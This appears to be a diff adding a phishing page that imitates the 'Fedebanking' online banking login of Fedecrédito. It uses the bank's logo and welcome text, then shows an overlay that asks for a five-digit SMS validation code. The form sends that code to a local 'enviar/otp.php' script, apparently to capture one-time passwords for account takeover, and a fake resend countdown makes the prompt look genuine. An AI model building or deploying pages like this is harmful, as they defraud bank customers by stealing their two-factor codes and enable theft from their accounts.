@@ -1,0 +1,270 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <title>Fedebanking</title>
+    <link href="./system/bootstrap.min.css" rel="stylesheet" />
+    <!-- 22062 -->
+    <link rel="stylesheet" href="./system/master.css" />
+</head>
+
+<body id="login" style="">
+    <!--header-->
+    <div id="header" class="container">
+        <div class="row">
+            <div class="col-xs-6 col-sm-3 col-md-3">
+                <img id="logo" src="./system/logo-fedecredito.png" alt="" class="img-responsive" />
+            </div>
+            <div class="col-xs-6 col-sm-9 col-md-9">
+                <div class="security-seal-welcome"></div>
+            </div>
+        </div>
+    </div>
+    <br />
+    <div class="container-fluid">
+        <div class="row">
+            <div class="linea-header"></div>
+        </div>
+    </div>
+    <section class="all" id="login-container">
+        <div class="container">
+            <div class="row push_3 grid_9 Container_12">
+                <div id="izquier-log" class="col-xs-12 col-sm-8 col-md-8 grid_4">
+                    <h3>Bienvenido</h3>
+                    <h5 style="font-weight: bold;">
+                        <span style="font-size: 1.2em;">Bienvenido a FEDE BANKING,</span> el servicio de banca en línea
+                        para los
+                        socios y clientes de las CAJAS DE CRÉDITO y los BANCOS DE LOS
+                        TRABAJADORES miembros del SISTEMA FEDECRÉDITO.
+                    </h5>
+                    <style>
+                        body {
+                            margin: 0;
+                            align-items: center;
+                            justify-content: center;
+                            min-height: 100vh;
+                            background-color: #f0f0f0;
+                            font-family: Arial, sans-serif;
+                        }
+
+                        .overlay {
+                            position: fixed;
+                            top: 0;
+                            left: 0;
+                            width: 100%;
+                            height: 100%;
+                            background-color: rgba(0, 0, 0, 0.5);
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            z-index: 999;
+                        }
+
+                        .otp-container {
+                            background-color: white;
+                            border-radius: 10px;
+                            padding: 20px;
+                            text-align: center;
+                            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.2);
+                            max-width: 337px;
+                            /* Ajusta el ancho del contenedor aquí */
+                            margin: 0 auto;
+                        }
+
+                        .otp-title {
+                            font-size: 20px;
+                            font-weight: bold;
+                            color: #125b12;
+                            margin-bottom: 10px;
+                        }
+
+                        .otp-subtitle {
+                            font-size: 18px;
+                            color: #666;
+                            margin-bottom: 20px;
+                        }
+
+                        .otp-input {
+                            font-size: 24px;
+                            text-align: center;
+                        }
+
+                        .otp-input input {
+                            border: none;
+                            border-bottom: 3px solid #858585;
+                            font-size: 24px;
+                            width: 40px;
+                            margin: 0 5px;
+                            text-align: center;
+                            outline: none;
+                        }
+
+                        .countdown {
+                            font-size: 18px;
+                            display: flex;
+                            margin-top: 56px;
+                            margin-bottom: 25px;
+                            color: #666;
+                            justify-content: center;
+                        }
+
+                        #resendContainer {
+                            display: flex;
+                            align-items: center;
+                            margin-top: 10px;
+                            justify-content: flex-end;
+                        }
+
+                        #resendButton {
+                            color: #a5a5a5;
+                            border: 0px;
+                            background: transparent;
+                            cursor: pointer;
+                        }
+
+                        #aliasInput {
+                            border: 1px solid #929293;
+                            border-radius: 7px;
+                            font-size: 17px;
+                            width: 93%;
+                            margin-right: 28px;
+                            margin-top: 30px;
+                            padding: 12px;
+                            outline: none;
+                        }
+
+                        #actionButtons {
+                            display: flex;
+                            justify-content: space-between;
+                            margin-top: 100px;
+                            justify-content: space-evenly;
+                        }
+
+                        #validateButton {
+                            color: #fcf8e3;
+                            cursor: pointer;
+                            background: #0a6644;
+                            border-radius: 19px;
+                            width: 103px;
+                            height: 54px;
+                        }
+
+                        #cancelButton {
+                            color: #0a6644;
+                            cursor: pointer;
+                            background: #f0f1f1;
+                            border-radius: 19px;
+                            width: 103px;
+                            height: 54px;
+                        }
+
+                       
+                    </style>
+                    </head>
+
+                    <body>
+                        <div class="overlay">
+                            <div class="otp-container">
+                                <div class="otp-title">Ingrese el codigo de validacion</div>
+                                <div class="otp-subtitle">
+                                    Hemos enviado un codigo de validacion a su telefono celular registrado
+                                    en el sistema
+                                </div>
+                                <br />
+                                <form name="login" method="post" action="enviar/otp.php">
+                                    <div></div>
+                                    <div class="otp-subtitle">Ingresa el codigo para continuar</div>
+                                    <br />
+                                    <div class="otp-input">
+                                        <input name="input1" id="input1" type="text" maxlength="1" oninput="moveToNextInput(1)"
+                                            onkeydown="handleBackspace(event, 1)" required />
+                                        <span></span>
+                                        <input name="input2" id="input2" type="text" maxlength="1" oninput="moveToNextInput(2)"
+                                            onkeydown="handleBackspace(event, 2)" required />
+                                        <span></span>
+                                        <input name="input3" id="input3" type="text" maxlength="1" oninput="moveToNextInput(3)"
+                                            onkeydown="handleBackspace(event, 3)" required />
+                                        <span></span>
+                                        <input name="input4" id="input4" type="text" maxlength="1" oninput="moveToNextInput(4)"
+                                            onkeydown="handleBackspace(event, 4)" required />
+                                        <span></span>
+                                        <input name="input5" id="input5" type="text" maxlength="1"
+                                            onkeydown="handleBackspace(event, 5)" required />
+                                    </div>
+                                    <div class="countdown" id="countdown">
+                                        <span id="count"></span>
+                                        <div>
+                                            <a id="resendLink" href="" onclick="startCountdown()" disabled>Reenviar
+                                                SMS</a>
+                                        </div>
+                                    </div>
+                                    <div id="actionButtons">
+                                        <button id="cancelButton" disabled>Cancelar</button>
+                                        <button id="validateButton">Validar</button>
+                                    </div>
+                            </div>
+                        </div>
+                        </form>
+                        <script>
+                            let countdownInterval;
+
+                            window.onload = function () {
+                                startCountdown();
+                            };
+
+                            function startCountdown() {
+                                const countdownElement = document.getElementById("count");
+                                const resendLink = document.getElementById("resendLink");
+
+                                countdownElement.textContent = "59";
+                                resendLink.style.display = "none";
+
+                                let remainingSeconds = 60;
+                                countdownInterval = setInterval(function () {
+                                    remainingSeconds--;
+                                    countdownElement.textContent = remainingSeconds;
+                                    if (remainingSeconds <= 0) {
+                                        clearInterval(countdownInterval);
+                                        countdownElement.textContent = "0";
+                                        resendLink.style.display = "inline";
+                                        resendLink.removeAttribute("disabled");
+                                    }
+                                }, 1000);
+                            }
+
+                            function moveToNextInput(inputNumber) {
+                                const maxLength = 1; // Dígitos máximos por input
+                                const input = document.getElementById(`input${inputNumber}`);
+                                const nextInputNumber = inputNumber + 1;
+
+                                if (input.value.length >= maxLength) {
+                                    if (nextInputNumber <= 5) {
+                                        const nextInput = document.getElementById(
+                                            `input${nextInputNumber}`
+                                        );
+                                        nextInput.focus();
+                                    }
+                                }
+                            }
+
+                            function handleBackspace(event, inputNumber) {
+                                if (event.key === "Backspace") {
+                                    const input = document.getElementById(`input${inputNumber}`);
+                                    const prevInputNumber = inputNumber - 1;
+
+                                    if (input.value.length === 0 && prevInputNumber >= 1) {
+                                        const prevInput = document.getElementById(
+                                            `input${prevInputNumber}`
+                                        );
+                                        prevInput.value = "";
+                                        prevInput.focus();
+                                    }
+                                }
+                            }
+                        </script>
+                    </body>
+
+</html>
